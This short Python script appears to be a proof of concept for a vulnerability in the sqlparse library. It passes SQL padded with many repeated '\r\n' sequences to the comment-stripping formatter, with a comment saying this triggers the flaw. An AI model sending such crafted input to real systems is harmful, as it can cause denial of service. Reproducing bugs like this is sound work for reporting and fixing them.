import sqlparse

sql = """
-- This is a comment
SELECT * FROM users;  -- Another comment
-- Repeated comments
""" + "\r\n" * 1000  # Adding many repetitions of '\r\n' to trigger the vulnerability

formatted_sql = sqlparse.format(sql, strip_comments=True)
print(formatted_sql)